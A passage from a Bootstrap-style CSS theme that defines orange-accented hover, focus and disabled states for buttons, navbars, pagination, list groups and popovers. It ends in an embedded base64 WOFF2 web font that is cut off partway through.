fieldset[disabled] .btn-danger:focus,
fieldset[disabled] .btn-danger:active {
    background-color: #ff0b0b;
    border-color: #d70000
}

.btn-link:active {
    background-color: transparent;
    -webkit-box-shadow: none;
    box-shadow: none
}

.btn-link:hover,
.btn-link:focus,
.btn-link:active {
    border-color: transparent
}

.btn-link:hover,
.btn-link:focus {
    color: rgb(255, 145.1, 76.5);
    text-decoration: underline;
    background-color: transparent
}

.btn-link[disabled]:hover,
.btn-link[disabled]:focus,
fieldset[disabled] .btn-link:hover,
fieldset[disabled] .btn-link:focus {
    color: #A8A8A8;
    text-decoration: none
}

.dropdown-toggle:focus {
    outline: 0
}

.dropdown-menu>li>a:hover,
.dropdown-menu>li>a:focus {
    text-decoration: none;
    color: rgb(38.25, 38.25, 38.25);
    background-color: #f5f5f5
}

.dropdown-menu>.active>a:hover,
.dropdown-menu>.active>a:focus {
    color: #fff;
    text-decoration: none;
    outline: 0;
    background-color: #FF6200
}

.dropdown-menu>.disabled>a:hover,
.dropdown-menu>.disabled>a:focus {
    color: #696969
}

.dropdown-menu>.disabled>a:hover,
.dropdown-menu>.disabled>a:focus {
    text-decoration: none;
    background-color: transparent;
    background-image: none;
    filter: progid:DXImageTransform.Microsoft.gradient(enabled=false);
    cursor: not-allowed
}

.btn-group>.btn:hover,
.btn-group>.btn:focus,
.btn-group>.btn:active,
.btn-group-vertical>.btn:hover,
.btn-group-vertical>.btn:focus,
.btn-group-vertical>.btn:active {
    z-index: 2
}

.btn-toolbar:before,
.btn-toolbar:after {
    content: " ";
    display: table
}

.btn-toolbar:after {
    clear: both
}

.btn-group .dropdown-toggle:active {
    outline: 0
}

.btn-group-vertical>.btn-group:before,
.btn-group-vertical>.btn-group:after {
    content: " ";
    display: table
}

.btn-group-vertical>.btn-group:after {
    clear: both
}

.input-group-btn>.btn:hover,
.input-group-btn>.btn:focus,
.input-group-btn>.btn:active {
    z-index: 2
}

.nav:before,
.nav:after {
    content: " ";
    display: table
}

.nav:after {
    clear: both
}

.nav>li>a:hover,
.nav>li>a:focus {
    text-decoration: none;
    background-color: #A8A8A8
}

.nav>li.disabled>a:hover,
.nav>li.disabled>a:focus {
    color: #696969;
    text-decoration: none;
    background-color: transparent;
    cursor: not-allowed
}

.nav .open>a:hover,
.nav .open>a:focus {
    background-color: #A8A8A8;
    border-color: #FF6200
}

.nav-tabs>li>a:hover {
    border-color: #A8A8A8 #A8A8A8 #ddd
}

.nav-tabs>li.active>a:hover,
.nav-tabs>li.active>a:focus {
    color: #696969;
    background-color: #fff;
    border: 1px solid #ddd;
    border-bottom-color: transparent;
    cursor: default
}

.nav-pills>li.active>a:hover,
.nav-pills>li.active>a:focus {
    color: #fff;
    background-color: #FF6200
}

.nav-tabs-justified>.active>a:hover,
.nav-tabs-justified>.active>a:focus {
    border: 1px solid #ddd
}

@media (min-width:768px) {

    .nav-tabs-justified>.active>a:hover,
    .nav-tabs-justified>.active>a:focus {
        border-bottom-color: #fff
    }
}

.navbar {
    position: relative;
    min-height: 50px;
    border: 1px solid transparent
}

.navbar:before,
.navbar:after {
    content: " ";
    display: table
}

.navbar:after {
    clear: both
}

.navbar-header:before,
.navbar-header:after {
    content: " ";
    display: table
}

.navbar-header:after {
    clear: both
}

.navbar-collapse:before,
.navbar-collapse:after {
    content: " ";
    display: table
}

.navbar-collapse:after {
    clear: both
}

@media (min-width:768px) {
    .container-fluid>.navbar-header {
        margin-right: 0;
        margin-left: 0
    }
}

.navbar-static-top {
    border-width: 0 0 1px
}

@media (min-width:768px) {
    .navbar-static-top {
        border-radius: 0
    }
}

.navbar-brand {
    padding: 16px 7px;
    height: 50px
}

.navbar-brand:hover,
.navbar-brand:focus {
    text-decoration: none
}

@media (min-width:768px) {
    .navbar>.container-fluid .navbar-brand {
        margin-left: -7px
    }
}

@media (min-width:1025px) {
    .navbar-brand {
        height: 70px
    }
}

.navbar-toggle:focus {
    outline: 0
}

@media (max-width:767px) {

    .navbar-nav .open .dropdown-menu>li>a:hover,
    .navbar-nav .open .dropdown-menu>li>a:focus {
        background-image: none
    }
}

.navbar-default .navbar-brand:hover,
.navbar-default .navbar-brand:focus {
    color: rgb(93.5, 93.5, 93.5);
    background-color: transparent
}

.navbar-default .navbar-nav>li>a:hover,
.navbar-default .navbar-nav>li>a:focus {
    color: #333;
    background-color: transparent
}

.navbar-default .navbar-nav>.active>a:hover,
.navbar-default .navbar-nav>.active>a:focus {
    color: #555;
    background-color: rgb(228.45, 228.45, 231.4)
}

.navbar-default .navbar-nav>.disabled>a:hover,
.navbar-default .navbar-nav>.disabled>a:focus {
    color: #ccc;
    background-color: transparent
}

.navbar-default .navbar-toggle:hover,
.navbar-default .navbar-toggle:focus {
    background-color: #ddd
}

.navbar-default .navbar-nav>.open>a:hover,
.navbar-default .navbar-nav>.open>a:focus {
    background-color: rgb(228.45, 228.45, 231.4);
    color: #555
}

@media (max-width:767px) {

    .navbar-default .navbar-nav .open .dropdown-menu>li>a:hover,
    .navbar-default .navbar-nav .open .dropdown-menu>li>a:focus {
        color: #333;
        background-color: transparent
    }

    .navbar-default .navbar-nav .open .dropdown-menu>.active>a:hover,
    .navbar-default .navbar-nav .open .dropdown-menu>.active>a:focus {
        color: #555;
        background-color: rgb(228.45, 228.45, 231.4)
    }

    .navbar-default .navbar-nav .open .dropdown-menu>.disabled>a:hover,
    .navbar-default .navbar-nav .open .dropdown-menu>.disabled>a:focus {
        color: #ccc;
        background-color: transparent
    }
}

.navbar-default .navbar-link:hover {
    color: #333
}

.navbar-default .btn-link:hover,
.navbar-default .btn-link:focus {
    color: #333
}

.navbar-default .btn-link[disabled]:hover,
.navbar-default .btn-link[disabled]:focus,
fieldset[disabled] .navbar-default .btn-link:hover,
fieldset[disabled] .navbar-default .btn-link:focus {
    color: #ccc
}

.navbar-inverse {
    background-color: #FFF;
    border-color: #D9D9D9
}

.navbar-inverse .navbar-brand {
    color: #696969
}

.navbar-inverse .navbar-brand:hover,
.navbar-inverse .navbar-brand:focus {
    color: #696969;
    background-color: transparent
}

.navbar-inverse .navbar-nav>li>a:hover,
.navbar-inverse .navbar-nav>li>a:focus {
    color: #696969;
    background-color: transparent
}

.navbar-inverse .navbar-nav>.active>a:hover,
.navbar-inverse .navbar-nav>.active>a:focus {
    color: #696969;
    background-color: rgb(229.5, 229.5, 229.5)
}

.navbar-inverse .navbar-nav>.disabled>a:hover,
.navbar-inverse .navbar-nav>.disabled>a:focus {
    color: rgb(153, 58.8, 0);
    background-color: transparent
}

.navbar-inverse .navbar-toggle:hover,
.navbar-inverse .navbar-toggle:focus {
    background-color: rgb(204, 78.4, 0)
}

.navbar-inverse .navbar-nav>.open>a:hover,
.navbar-inverse .navbar-nav>.open>a:focus {
    background-color: rgb(229.5, 229.5, 229.5);
    color: #696969
}

@media (max-width:767px) {

    .navbar-inverse .navbar-nav .open .dropdown-menu>li>a:hover,
    .navbar-inverse .navbar-nav .open .dropdown-menu>li>a:focus {
        color: #696969;
        background-color: transparent
    }

    .navbar-inverse .navbar-nav .open .dropdown-menu>.active>a:hover,
    .navbar-inverse .navbar-nav .open .dropdown-menu>.active>a:focus {
        color: #696969;
        background-color: rgb(229.5, 229.5, 229.5)
    }

    .navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a:hover,
    .navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a:focus {
        color: rgb(153, 58.8, 0);
        background-color: transparent
    }
}

.navbar-inverse .navbar-link:hover {
    color: #696969
}

.navbar-inverse .btn-link:hover,
.navbar-inverse .btn-link:focus {
    color: #696969
}

.navbar-inverse .btn-link[disabled]:hover,
.navbar-inverse .btn-link[disabled]:focus,
fieldset[disabled] .navbar-inverse .btn-link:hover,
fieldset[disabled] .navbar-inverse .btn-link:focus {
    color: rgb(153, 58.8, 0)
}

.breadcrumb>li+li:before {
    content: "/ ";
    padding: 0 5px;
    color: #ccc
}

.pagination>li>a:hover,
.pagination>li>a:focus,
.pagination>li>span:hover,
.pagination>li>span:focus {
    color: rgb(255, 145.1, 76.5);
    background-color: #A8A8A8;
    border-color: #ddd
}

.pagination>.active>a:hover,
.pagination>.active>a:focus,
.pagination>.active>span:hover,
.pagination>.active>span:focus {
    z-index: 2;
    color: #fff;
    background-color: #FF6200;
    border-color: #FF6200;
    cursor: default
}

.pagination>.disabled>span:hover,
.pagination>.disabled>span:focus,
.pagination>.disabled>a:hover,
.pagination>.disabled>a:focus {
    color: #696969;
    background-color: #fff;
    border-color: #ddd;
    cursor: not-allowed
}

.pager:before,
.pager:after {
    content: " ";
    display: table
}

.pager:after {
    clear: both
}

.pager li>a:hover,
.pager li>a:focus {
    text-decoration: none;
    background-color: #A8A8A8
}

.pager .disabled>a:hover,
.pager .disabled>a:focus {
    color: #696969;
    background-color: #fff;
    cursor: not-allowed
}

a.label:hover,
a.label:focus {
    color: #fff;
    text-decoration: none;
    cursor: pointer
}

.label-default[href]:hover,
.label-default[href]:focus {
    background-color: rgb(79.5, 79.5, 79.5)
}

.label-primary[href]:hover,
.label-primary[href]:focus {
    background-color: rgb(204, 78.4, 0)
}

.label-success[href]:hover,
.label-success[href]:focus {
    background-color: rgb(38.8712871287, 112.1287128713, 60.5495049505)
}

.label-info[href]:hover,
.label-info[href]:focus {
    background-color: rgb(51.75, 130.5, 191.25)
}

.label-warning[href]:hover,
.label-warning[href]:focus {
    background-color: rgb(204, 78.4, 0)
}

.label-danger[href]:hover,
.label-danger[href]:focus {
    background-color: #a40000
}

a.badge:hover,
a.badge:focus {
    color: #fff;
    text-decoration: none;
    cursor: pointer
}

a.thumbnail:hover,
a.thumbnail:focus {
    border-color: #FF6200
}

@-webkit-keyframes progress-bar-stripes {
    from {
        background-position: 40px 0
    }

    to {
        background-position: 0 0
    }
}

@keyframes progress-bar-stripes {
    from {
        background-position: 40px 0
    }

    to {
        background-position: 0 0
    }
}

a.list-group-item:hover,
a.list-group-item:focus {
    text-decoration: none;
    color: #555;
    background-color: #f5f5f5
}

.list-group-item.disabled:hover,
.list-group-item.disabled:focus {
    background-color: #A8A8A8;
    color: #696969;
    cursor: not-allowed
}

.list-group-item.disabled:hover .list-group-item-heading,
.list-group-item.disabled:focus .list-group-item-heading {
    color: inherit
}

.list-group-item.disabled:hover .list-group-item-text,
.list-group-item.disabled:focus .list-group-item-text {
    color: #696969
}

.list-group-item.active:hover,
.list-group-item.active:focus {
    z-index: 2;
    color: #fff;
    background-color: #FF6200;
    border-color: #FF6200
}

.list-group-item.active:hover .list-group-item-heading,
.list-group-item.active:hover .list-group-item-heading>small,
.list-group-item.active:hover .list-group-item-heading>.small,
.list-group-item.active:focus .list-group-item-heading,
.list-group-item.active:focus .list-group-item-heading>small,
.list-group-item.active:focus .list-group-item-heading>.small {
    color: inherit
}

.list-group-item.active:hover .list-group-item-text,
.list-group-item.active:focus .list-group-item-text {
    color: rgb(255, 223.6, 204)
}

a.list-group-item-success:hover,
a.list-group-item-success:focus {
    color: #349651;
    background-color: rgb(232.5, 232.5, 235)
}

a.list-group-item-success.active:hover,
a.list-group-item-success.active:focus {
    color: #fff;
    background-color: #349651;
    border-color: #349651
}

a.list-group-item-info:hover,
a.list-group-item-info:focus {
    color: #559BD1;
    background-color: rgb(232.5, 232.5, 235)
}

a.list-group-item-info.active:hover,
a.list-group-item-info.active:focus {
    color: #fff;
    background-color: #559BD1;
    border-color: #559BD1
}

a.list-group-item-warning:hover,
a.list-group-item-warning:focus {
    color: #FF6200;
    background-color: rgb(232.5, 232.5, 235)
}

a.list-group-item-warning.active:hover,
a.list-group-item-warning.active:focus {
    color: #fff;
    background-color: #FF6200;
    border-color: #FF6200
}

a.list-group-item-danger:hover,
a.list-group-item-danger:focus {
    color: #d70000;
    background-color: rgb(232.5, 232.5, 235)
}

a.list-group-item-danger.active:hover,
a.list-group-item-danger.active:focus {
    color: #fff;
    background-color: #d70000;
    border-color: #d70000
}

.panel-body:before,
.panel-body:after {
    content: " ";
    display: table
}

.panel-body:after {
    clear: both
}

.close {
    float: right;
    font-size: 19.5px;
    font-weight: bold;
    line-height: 1;
    color: #000;
    text-shadow: 0 1px 0#fff;
    opacity: 0.2;
    filter: alpha(opacity=20)
}

.close:hover,
.close:focus {
    color: #000;
    text-decoration: none;
    cursor: pointer;
    opacity: 0.5;
    filter: alpha(opacity=50)
}

button.close {
    padding: 0;
    cursor: pointer;
    background: transparent;
    border: 0;
    -webkit-appearance: none
}

.modal-footer:before,
.modal-footer:after {
    content: " ";
    display: table
}

.modal-footer:after {
    clear: both
}

.popover>.arrow:after {
    position: absolute;
    display: block;
    width: 0;
    height: 0;
    border-color: transparent;
    border-style: solid
}

.popover>.arrow:after {
    border-width: 10px;
    content: ""
}

.popover.top>.arrow:after {
    content: " ";
    bottom: 1px;
    margin-left: -10px;
    border-bottom-width: 0;
    border-top-color: #fff
}

.popover.right>.arrow:after {
    content: " ";
    left: 1px;
    bottom: -10px;
    border-left-width: 0;
    border-right-color: #fff
}

.popover.bottom>.arrow:after {
    content: " ";
    top: 1px;
    margin-left: -10px;
    border-top-width: 0;
    border-bottom-color: #fff
}

.popover.left>.arrow:after {
    content: " ";
    right: 1px;
    border-right-width: 0;
    border-left-color: #fff;
    bottom: -10px
}

.carousel-control:hover,
.carousel-control:focus {
    outline: 0;
    color: #fff;
    text-decoration: none;
    opacity: 0.9;
    filter: alpha(opacity=90)
}

.carousel-control .icon-prev:before {
    content: "‹"
}

.carousel-control .icon-next:before {
    content: "›"
}

.clearfix:before,
.clearfix:after {
    content: " ";
    display: table
}

.clearfix:after {
    clear: both
}

.hidden {
    visibility: hidden !important
}

@-ms-viewport {
    width: device-width
}

@font-face {
    font-family: "ingme";
    src: url(data:font/woff2;base64,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